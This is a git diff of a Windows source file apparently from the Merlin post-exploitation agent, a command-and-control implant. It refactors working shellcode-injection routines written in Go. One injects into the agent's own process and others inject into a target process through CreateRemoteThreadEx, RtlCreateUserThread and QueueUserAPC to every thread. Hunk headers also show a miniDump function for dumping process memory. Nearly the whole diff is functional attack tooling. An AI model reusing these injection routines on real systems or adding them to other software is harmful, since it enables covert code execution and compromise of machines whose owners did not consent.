@@ -36,46 +36,13 @@ import (
 	"golang.org/x/sys/windows"
 
 	// Sub Repositories
+	"github.com/Ne0nd0g/merlin-agent/os/windows/api/kernel32"
+	"github.com/Ne0nd0g/merlin-agent/os/windows/api/ntdll"
 	"github.com/Ne0nd0g/merlin-agent/os/windows/pkg/pipes"
 	"github.com/Ne0nd0g/merlin-agent/os/windows/pkg/tokens"
 )
 
-const (
-	// MEM_COMMIT is a Windows constant used with Windows API calls
-	MEM_COMMIT = 0x1000
-	// MEM_RESERVE is a Windows constant used with Windows API calls
-	MEM_RESERVE = 0x2000
-	// MEM_RELEASE is a Windows constant used with Windows API calls
-	MEM_RELEASE = 0x8000
-	// PAGE_EXECUTE is a Windows constant used with Windows API calls
-	PAGE_EXECUTE = 0x10
-	// PAGE_EXECUTE_READWRITE is a Windows constant used with Windows API calls
-	PAGE_EXECUTE_READWRITE = 0x40
-	// PAGE_READWRITE is a Windows constant used with Windows API calls
-	PAGE_READWRITE = 0x04
-	// PROCESS_CREATE_THREAD is a Windows constant used with Windows API calls
-	PROCESS_CREATE_THREAD = 0x0002
-	// PROCESS_VM_READ is a Windows constant used with Windows API calls
-	PROCESS_VM_READ = 0x0010
-	//PROCESS_VM_WRITE is a Windows constant used with Windows API calls
-	PROCESS_VM_WRITE = 0x0020
-	// PROCESS_VM_OPERATION is a Windows constant used with Windows API calls
-	PROCESS_VM_OPERATION = 0x0008
-	// PROCESS_QUERY_INFORMATION is a Windows constant used with Windows API calls
-	PROCESS_QUERY_INFORMATION = 0x0400
-	// TH32CS_SNAPHEAPLIST is a Windows constant used with Windows API calls
-	TH32CS_SNAPHEAPLIST = 0x00000001
-	// TH32CS_SNAPMODULE is a Windows constant used with Windows API calls
-	TH32CS_SNAPMODULE = 0x00000008
-	// TH32CS_SNAPPROCESS is a Windows constant used with Windows API calls
-	TH32CS_SNAPPROCESS = 0x00000002
-	// TH32CS_SNAPTHREAD is a Windows constant used with Windows API calls
-	TH32CS_SNAPTHREAD = 0x00000004
-	// THREAD_SET_CONTEXT is a Windows constant used with Windows API calls
-	THREAD_SET_CONTEXT = 0x0010
-)
-
-// executeCommand is function used to instruct an agent to execute a command on the host operating system
+// executeCommand instruct an agent to execute a program on the host operating system
 func executeCommand(name string, args []string) (stdout string, stderr string) {
 	attr := &syscall.SysProcAttr{
 		HideWindow: true,
@@ -113,54 +80,32 @@ func executeCommandWithAttributes(name string, args []string, attr *syscall.SysP
 
 // ExecuteShellcodeSelf executes provided shellcode in the current process
 func ExecuteShellcodeSelf(shellcode []byte) error {
-
-	kernel32 := windows.NewLazySystemDLL("kernel32")
-	ntdll := windows.NewLazySystemDLL("ntdll.dll")
-
-	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
-	//VirtualProtect := kernel32.NewProc("VirtualProtectEx")
-	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
-
-	addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
-
-	if errVirtualAlloc.Error() != "The operation completed successfully." {
-		return errors.New("Error calling VirtualAlloc:\r\n" + errVirtualAlloc.Error())
+	addr, err := windows.VirtualAlloc(uintptr(0), uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+	if err != nil {
+		return fmt.Errorf("commands/exec.ExecuteShellcodeSelf: there was an error calling Windows API VirtualAlloc: %s", err)
 	}
 
-	if addr == 0 {
-		return errors.New("VirtualAlloc failed and returned 0")
+	err = ntdll.RtlCopyMemory(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uint32(len(shellcode)))
+	if err != nil {
+		return fmt.Errorf("commands/exec.ExecuteShellcodeSelf: %s", err)
 	}
 
-	_, _, errRtlCopyMemory := RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
-
-	if errRtlCopyMemory.Error() != "The operation completed successfully." {
-		return errors.New("Error calling RtlCopyMemory:\r\n" + errRtlCopyMemory.Error())
-	}
-	// TODO set initial memory allocation to rw and update to execute; currently getting "The parameter is incorrect."
-	/*	_, _, errVirtualProtect := VirtualProtect.Call(uintptr(addr), uintptr(len(shellcode)), PAGE_EXECUTE)
-		if errVirtualProtect.Error() != "The operation completed successfully." {
-			return errVirtualProtect
-		}*/
-
-	_, _, errSyscall := syscall.Syscall(addr, 0, 0, 0, 0)
-
-	if errSyscall != 0 {
-		return errors.New("Error executing shellcode syscall:\r\n" + errSyscall.Error())
+	var lpflOldProtect uint32
+	err = windows.VirtualProtect(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &lpflOldProtect)
+	if err != nil {
+		return fmt.Errorf("commands/exec.ExecuteShellcodeRemote: there was an error calling Windows API VirtualProtect: %s", err)
 	}
 
+	// Execute the shellcode
+	_, _, err = syscall.SyscallN(addr, 0)
+	if err != windows.Errno(0) {
+		return fmt.Errorf("commands/exec.ExecuteShellcodeRemote: there was an error executing the shellcode by making a syscall on the start address: %s", err)
+	}
 	return nil
 }
 
 // ExecuteShellcodeRemote executes provided shellcode in the provided target process
 func ExecuteShellcodeRemote(shellcode []byte, pid uint32) error {
-	kernel32 := windows.NewLazySystemDLL("kernel32")
-
-	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
-	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
-	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
-	CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")
-	CloseHandle := kernel32.NewProc("CloseHandle")
-
 	// Setup OS environment, if any
 	err := Setup()
 	if err != nil {
@@ -168,58 +113,43 @@ func ExecuteShellcodeRemote(shellcode []byte, pid uint32) error {
 	}
 	defer TearDown()
 
-	pHandle, errOpenProcess := syscall.OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, false, pid)
-
-	if errOpenProcess != nil {
-		return errors.New("Error calling OpenProcess:\r\n" + errOpenProcess.Error())
+	desiredAccess := uint32(windows.PROCESS_CREATE_THREAD | windows.PROCESS_QUERY_INFORMATION | windows.PROCESS_VM_OPERATION | windows.PROCESS_VM_WRITE | windows.PROCESS_VM_READ)
+	handle, err := windows.OpenProcess(desiredAccess, false, pid)
+	if err != nil {
+		return fmt.Errorf("commands/exec.ExecuteShellcodeRemote: there was an error calling Windows API OpenProcess: %s", err)
 	}
+	defer windows.CloseHandle(handle)
 
-	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
-
-	if errVirtualAlloc.Error() != "The operation completed successfully." {
-		return errors.New("Error calling VirtualAlloc:\r\n" + errVirtualAlloc.Error())
+	addr, err := kernel32.VirtualAllocEx(uintptr(handle), 0, len(shellcode), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+	if err != nil {
+		return fmt.Errorf("commands/exec.ExecuteShellcodeRemote: %s", err)
 	}
 
 	if addr == 0 {
 		return errors.New("VirtualAllocEx failed and returned 0")
 	}
 
-	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pHandle), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
-
-	if errWriteProcessMemory.Error() != "The operation completed successfully." {
-		return errors.New("Error calling WriteProcessMemory:\r\n" + errWriteProcessMemory.Error())
+	var lpNumberOfBytesWritten uintptr
+	err = windows.WriteProcessMemory(handle, addr, &shellcode[0], uintptr(len(shellcode)), &lpNumberOfBytesWritten)
+	if err != nil {
+		return fmt.Errorf("commands/exec.ExecuteShellcodeRemote: there was an error calling Windows API WriteProcessMemory: %s", err)
 	}
 
-	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), PAGE_EXECUTE)
-	if errVirtualProtectEx.Error() != "The operation completed successfully." {
-		return errors.New("Error calling VirtualProtectEx:\r\n" + errVirtualProtectEx.Error())
+	var lpflOldProtect uint32
+	err = windows.VirtualProtectEx(handle, addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &lpflOldProtect)
+	if err != nil {
+		return fmt.Errorf("commands/exec.ExecuteShellcodeRemote: there was an error calling Windows API VirtualProtectEx: %s", err)
 	}
 
-	_, _, errCreateRemoteThreadEx := CreateRemoteThreadEx.Call(uintptr(pHandle), 0, 0, addr, 0, 0, 0)
-	if errCreateRemoteThreadEx.Error() != "The operation completed successfully." {
-		return errors.New("Error calling CreateRemoteThreadEx:\r\n" + errCreateRemoteThreadEx.Error())
+	_, err = kernel32.CreateRemoteThreadEx(uintptr(handle), 0, 0, addr, 0, 0, 0, 0)
+	if err != nil {
+		return fmt.Errorf("commands/exec.ExecuteShellcodeRemote: %s", err)
 	}
-
-	_, _, errCloseHandle := CloseHandle.Call(uintptr(pHandle))
-	if errCloseHandle.Error() != "The operation completed successfully." {
-		return errors.New("Error calling CloseHandle:\r\n" + errCloseHandle.Error())
-	}
-
 	return nil
 }
 
 // ExecuteShellcodeRtlCreateUserThread executes provided shellcode in the provided target process using the Windows RtlCreateUserThread call
 func ExecuteShellcodeRtlCreateUserThread(shellcode []byte, pid uint32) error {
-	kernel32 := windows.NewLazySystemDLL("kernel32")
-	ntdll := windows.NewLazySystemDLL("ntdll.dll")
-
-	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
-	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
-	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
-	CloseHandle := kernel32.NewProc("CloseHandle")
-	RtlCreateUserThread := ntdll.NewProc("RtlCreateUserThread")
-	WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")
-
 	// Setup OS environment, if any
 	err := Setup()
 	if err != nil {
@@ -227,63 +157,43 @@ func ExecuteShellcodeRtlCreateUserThread(shellcode []byte, pid uint32) error {
 	}
 	defer TearDown()
 
-	pHandle, errOpenProcess := syscall.OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, false, pid)
-
-	if errOpenProcess != nil {
-		return errors.New("Error calling OpenProcess:\r\n" + errOpenProcess.Error())
+	desiredAccess := uint32(windows.PROCESS_CREATE_THREAD | windows.PROCESS_QUERY_INFORMATION | windows.PROCESS_VM_OPERATION | windows.PROCESS_VM_WRITE | windows.PROCESS_VM_READ)
+	handle, err := windows.OpenProcess(desiredAccess, false, pid)
+	if err != nil {
+		return fmt.Errorf("commands/exec.ExecuteShellcodeRtlCreateUserThread: there was an error calling Windows API OpenProcess: %s", err)
 	}
+	defer windows.CloseHandle(handle)
 
-	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
-
-	if errVirtualAlloc.Error() != "The operation completed successfully." {
-		return errors.New("Error calling VirtualAlloc:\r\n" + errVirtualAlloc.Error())
+	addr, err := kernel32.VirtualAllocEx(uintptr(handle), 0, len(shellcode), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+	if err != nil {
+		return fmt.Errorf("commands/exec.ExecuteShellcodeRtlCreateUserThread: %s", err)
 	}
 
 	if addr == 0 {
 		return errors.New("VirtualAllocEx failed and returned 0")
 	}
 
-	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pHandle), addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
-
-	if errWriteProcessMemory.Error() != "The operation completed successfully." {
-		return errors.New("Error calling WriteProcessMemory:\r\n" + errWriteProcessMemory.Error())
+	var lpNumberOfBytesWritten uintptr
+	err = windows.WriteProcessMemory(handle, addr, &shellcode[0], uintptr(len(shellcode)), &lpNumberOfBytesWritten)
+	if err != nil {
+		return fmt.Errorf("commands/exec.ExecuteShellcodeRtlCreateUserThread: there was an error calling Windows API WriteProcessMemory: %s", err)
 	}
 
-	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), PAGE_EXECUTE)
-	if errVirtualProtectEx.Error() != "The operation completed successfully." {
-		return errors.New("Error calling VirtualProtectEx:\r\n" + errVirtualProtectEx.Error())
+	var lpflOldProtect uint32
+	err = windows.VirtualProtectEx(handle, addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &lpflOldProtect)
+	if err != nil {
+		return fmt.Errorf("commands/exec.ExecuteShellcodeRtlCreateUserThread: there was an error calling Windows API VirtualProtectEx: %s", err)
 	}
 
-	/*
-		NTSTATUS
-		RtlCreateUserThread(
-			IN HANDLE Process,
-			IN PSECURITY_DESCRIPTOR ThreadSecurityDescriptor OPTIONAL,
-			IN BOOLEAN CreateSuspended,
-			IN ULONG ZeroBits OPTIONAL,
-			IN SIZE_T MaximumStackSize OPTIONAL,
-			IN SIZE_T CommittedStackSize OPTIONAL,
-			IN PUSER_THREAD_START_ROUTINE StartAddress,
-			IN PVOID Parameter OPTIONAL,
-			OUT PHANDLE Thread OPTIONAL,
-			OUT PCLIENT_ID ClientId OPTIONAL
-			)
-	*/
 	var tHandle uintptr
-	_, _, errRtlCreateUserThread := RtlCreateUserThread.Call(uintptr(pHandle), 0, 0, 0, 0, 0, addr, 0, uintptr(unsafe.Pointer(&tHandle)), 0)
-
-	if errRtlCreateUserThread.Error() != "The operation completed successfully." {
-		return errors.New("Error calling RtlCreateUserThread:\r\n" + errRtlCreateUserThread.Error())
+	_, err = ntdll.RtlCreateUserThread(uintptr(handle), 0, 0, 0, 0, 0, addr, 0, uintptr(unsafe.Pointer(&tHandle)), 0)
+	if err != nil {
+		return fmt.Errorf("commands/exec.ExecuteShellcodeRtlCreateUserThread: %s", err)
 	}
 
-	_, _, errWaitForSingleObject := WaitForSingleObject.Call(tHandle, syscall.INFINITE)
-	if errWaitForSingleObject.Error() != "The operation completed successfully." {
-		return errors.New("Error calling WaitForSingleObject:\r\n" + errWaitForSingleObject.Error())
-	}
-
-	_, _, errCloseHandle := CloseHandle.Call(uintptr(pHandle))
-	if errCloseHandle.Error() != "The operation completed successfully." {
-		return errors.New("Error calling CloseHandle:\r\n" + errCloseHandle.Error())
+	_, err = windows.WaitForSingleObject(windows.Handle(tHandle), windows.INFINITE)
+	if err != nil {
+		return fmt.Errorf("commands/exec.ExecuteShellcodeRtlCreateUserThread: %s", err)
 	}
 
 	return nil
@@ -292,17 +202,6 @@ func ExecuteShellcodeRtlCreateUserThread(shellcode []byte, pid uint32) error {
 // ExecuteShellcodeQueueUserAPC executes provided shellcode in the provided target process using the Windows QueueUserAPC API call
 func ExecuteShellcodeQueueUserAPC(shellcode []byte, pid uint32) error {
 	// TODO this can be local or remote
-	kernel32 := windows.NewLazySystemDLL("kernel32")
-
-	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
-	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
-	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
-	CloseHandle := kernel32.NewProc("CloseHandle")
-	CreateToolhelp32Snapshot := kernel32.NewProc("CreateToolhelp32Snapshot")
-	QueueUserAPC := kernel32.NewProc("QueueUserAPC")
-	Thread32First := kernel32.NewProc("Thread32First")
-	Thread32Next := kernel32.NewProc("Thread32Next")
-	OpenThread := kernel32.NewProc("OpenThread")
 
 	// Setup OS environment, if any
 	err := Setup()
@@ -314,106 +213,91 @@ func ExecuteShellcodeQueueUserAPC(shellcode []byte, pid uint32) error {
 	// Consider using NtQuerySystemInformation to replace CreateToolhelp32Snapshot AND to find a thread in a wait state
 	// https://stackoverflow.com/questions/22949725/how-to-get-thread-state-e-g-suspended-memory-cpu-usage-start-time-priori
 
-	pHandle, errOpenProcess := syscall.OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, false, pid)
-
-	if errOpenProcess != nil {
-		return errors.New("Error calling OpenProcess:\r\n" + errOpenProcess.Error())
+	dwFlags := uint32(windows.TH32CS_SNAPTHREAD | windows.TH32CS_SNAPHEAPLIST | windows.TH32CS_SNAPMODULE | windows.TH32CS_SNAPPROCESS)
+	pSnapshot, err := windows.CreateToolhelp32Snapshot(dwFlags, pid)
+	if err != nil {
+		return fmt.Errorf("commands/exec.ExecuteShellcodeQueueUserAPC: there was an error calling Windows API CreateToolhelp32Snapshot: %s", err)
 	}
-	// TODO see if you can use just SNAPTHREAD
-	sHandle, _, errCreateToolhelp32Snapshot := CreateToolhelp32Snapshot.Call(TH32CS_SNAPHEAPLIST|TH32CS_SNAPMODULE|TH32CS_SNAPPROCESS|TH32CS_SNAPTHREAD, uintptr(pid))
-	if errCreateToolhelp32Snapshot.Error() != "The operation completed successfully." {
-		return errors.New("Error calling CreateToolhelp32Snapshot:\r\n" + errCreateToolhelp32Snapshot.Error())
+	defer windows.CloseHandle(pSnapshot)
+
+	desiredAccess := uint32(windows.PROCESS_CREATE_THREAD | windows.PROCESS_QUERY_INFORMATION | windows.PROCESS_VM_OPERATION | windows.PROCESS_VM_WRITE | windows.PROCESS_VM_READ)
+	handle, err := windows.OpenProcess(desiredAccess, false, pid)
+	if err != nil {
+		return fmt.Errorf("commands/exec.ExecuteShellcodeQueueUserAPC: there was an error calling Windows API OpenProcess: %s", err)
 	}
+	defer windows.CloseHandle(handle)
 
-	// TODO don't allocate/write memory unless there is a valid thread
-	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
-
-	if errVirtualAlloc.Error() != "The operation completed successfully." {
-		return errors.New("Error calling VirtualAlloc:\r\n" + errVirtualAlloc.Error())
+	addr, err := kernel32.VirtualAllocEx(uintptr(handle), 0, len(shellcode), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+	if err != nil {
+		return fmt.Errorf("commands/exec.ExecuteShellcodeQueueUserAPC: %s", err)
 	}
 
 	if addr == 0 {
 		return errors.New("VirtualAllocEx failed and returned 0")
 	}
 
-	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pHandle), addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
-
-	if errWriteProcessMemory.Error() != "The operation completed successfully." {
-		return errors.New("Error calling WriteProcessMemory:\r\n" + errWriteProcessMemory.Error())
+	var lpNumberOfBytesWritten uintptr
+	err = windows.WriteProcessMemory(handle, addr, &shellcode[0], uintptr(len(shellcode)), &lpNumberOfBytesWritten)
+	if err != nil {
+		return fmt.Errorf("commands/exec.ExecuteShellcodeQueueUserAPC: there was an error calling Windows API WriteProcessMemory: %s", err)
 	}
 
-	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), PAGE_EXECUTE)
-	if errVirtualProtectEx.Error() != "The operation completed successfully." {
-		return errors.New("Error calling VirtualProtectEx:\r\n" + errVirtualProtectEx.Error())
+	var lpflOldProtect uint32
+	err = windows.VirtualProtectEx(handle, addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &lpflOldProtect)
+	if err != nil {
+		return fmt.Errorf("commands/exec.ExecuteShellcodeQueueUserAPC: there was an error calling Windows API VirtualProtectEx: %s", err)
 	}
 
-	type THREADENTRY32 struct {
-		dwSize             uint32
-		cntUsage           uint32
-		th32ThreadID       uint32
-		th32OwnerProcessID uint32
-		tpBasePri          int32
-		tpDeltaPri         int32
-		dwFlags            uint32
+	threadEntry := windows.ThreadEntry32{
+		Size: uint32(unsafe.Sizeof(windows.ThreadEntry32{})),
 	}
-	var t THREADENTRY32
-	t.dwSize = uint32(unsafe.Sizeof(t))
+	err = windows.Thread32First(pSnapshot, &threadEntry)
+	if err != nil {
+		return fmt.Errorf("commands/exec.ExecuteShellcodeQueueUserAPC: there was an error calling Windows API Thread32First: %s", err)
+	}
 
-	_, _, errThread32First := Thread32First.Call(uintptr(sHandle), uintptr(unsafe.Pointer(&t)))
-	if errThread32First.Error() != "The operation completed successfully." {
-		return errors.New("Error calling Thread32First:\r\n" + errThread32First.Error())
-	}
 	i := true
 	x := 0
 	// Queue an APC for every thread; very unstable and not ideal, need to programmatically find alertable thread
 	for i {
-		_, _, errThread32Next := Thread32Next.Call(uintptr(sHandle), uintptr(unsafe.Pointer(&t)))
-		if errThread32Next.Error() == "There are no more files." {
-			if x == 1 {
-				// don't queue to main thread when using the "spray all threads" technique
-				// often crashes process
-				return errors.New("the process only has 1 thread; APC not queued")
+		err = windows.Thread32Next(pSnapshot, &threadEntry)
+		if err != nil {
+			// There are no more files.
+			if err == windows.ERROR_NO_MORE_FILES {
+				i = false
+				break
 			}
-			i = false
-			break
-		} else if errThread32Next.Error() != "The operation completed successfully." {
-			return errors.New("Error calling Thread32Next:\r\n" + errThread32Next.Error())
+			return fmt.Errorf("commands/exec.ExecuteShellcodeQueueUserAPC: there was an error calling Windows API Thread32Next: %s", err)
 		}
-		if t.th32OwnerProcessID == pid {
+		if threadEntry.OwnerProcessID == pid {
 			if x > 0 {
-				tHandle, _, errOpenThread := OpenThread.Call(THREAD_SET_CONTEXT, 0, uintptr(t.th32ThreadID))
-				if errOpenThread.Error() != "The operation completed successfully." {
-					return errors.New("Error calling OpenThread:\r\n" + errOpenThread.Error())
+				var hThread windows.Handle
+				hThread, err = windows.OpenThread(windows.THREAD_SET_CONTEXT, false, threadEntry.ThreadID)
+				if err != nil {
+					return fmt.Errorf("commands/exec.ExecuteShellcodeQueueUserAPC: there was an error calling Windows API OpenThread: %s", err)
 				}
-				// fmt.Println(fmt.Sprintf("Queueing APC for PID: %d, Thread %d", pid, t.th32ThreadID))
-				_, _, errQueueUserAPC := QueueUserAPC.Call(addr, tHandle, 0)
-				if errQueueUserAPC.Error() != "The operation completed successfully." {
-					return errors.New("Error calling QueueUserAPC:\r\n" + errQueueUserAPC.Error())
+				//fmt.Printf("Queueing APC for PID: %d, Thread %d\n", pid, threadEntry.ThreadID)
+				err = kernel32.QueueUserAPC(addr, uintptr(hThread), 0)
+				if err != nil {
+					return fmt.Errorf("commands/exec.ExecuteShellcodeQueueUserAPC: %s", err)
 				}
 				x++
-				_, _, errCloseHandle := CloseHandle.Call(tHandle)
-				if errCloseHandle.Error() != "The operation completed successfully." {
-					return errors.New("Error calling thread CloseHandle:\r\n" + errCloseHandle.Error())
+				err = windows.CloseHandle(hThread)
+				if err != nil {
+					return fmt.Errorf("commands/exec.ExecuteShellcodeQueueUserAPC: there was an error calling Windows API CloseHandle: %s", err)
 				}
 			} else {
 				x++
 			}
 		}
-
 	}
-	// TODO check process to make sure it didn't crash
-	_, _, errCloseHandle := CloseHandle.Call(uintptr(pHandle))
-	if errCloseHandle.Error() != "The operation completed successfully." {
-		return errors.New("Error calling CloseHandle:\r\n" + errCloseHandle.Error())
-	}
-
 	return nil
 }
 
 // ExecuteShellcodeCreateProcessWithPipe creates a child process, redirects STDOUT/STDERR to an anonymous pipe, injects/executes shellcode, and retrieves output
 // Returns STDOUT and STDERR from process execution. Any encountered errors in this function are also returned in STDERR
 func ExecuteShellcodeCreateProcessWithPipe(sc string, spawnto string, args string) (stdout string, stderr string, err error) {
-	// Base64 decode string  into bytes
+	// Base64 decode string into bytes
 	shellcode, errDecode := base64.StdEncoding.DecodeString(sc)
 	if errDecode != nil {
 		return stdout, stderr, fmt.Errorf("there  was an error decoding the Base64 string: %s", errDecode)
@@ -682,7 +566,7 @@ func miniDump(tempDir string, process string, inPid uint32) (map[string]interfac
 	mini = make(map[string]interface{})
 	var err error
 
-	// Make sure temporary directory exists before executing miniDump functionality
+	// Make sure a temporary directory exists before executing miniDump functionality
 	if tempDir != "" {
 		d, errS := os.Stat(tempDir)
 		if os.IsNotExist(errS) {
@@ -769,7 +653,7 @@ func getProcess(name string, pid uint32) (string, uint32, error) {
 		return "", 0, fmt.Errorf("a process name OR process ID must be provided")
 	}
 
-	snapshotHandle, err := syscall.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
+	snapshotHandle, err := syscall.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
 	if snapshotHandle < 0 || err != nil {
 		return "", 0, fmt.Errorf("there was an error creating the snapshot:\r\n%s", err)
 	}
@@ -860,7 +744,8 @@ func sePrivEnable(s string) error {
 	return nil
 }
 
-// Query the child process and find its image base address from its Process Environment Block (PEB)
+// PEB is the Process Environment Block structure that contains information about a process
+// https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb
 // https://github.com/winlabs/gowin32/blob/0b6f3bef0b7501b26caaecab8d52b09813224373/wrappers/winternl.go#L37
 // http://bytepointer.com/resources/tebpeb32.htm
 // https://www.nirsoft.net/kernel_struct/vista/PEB.html
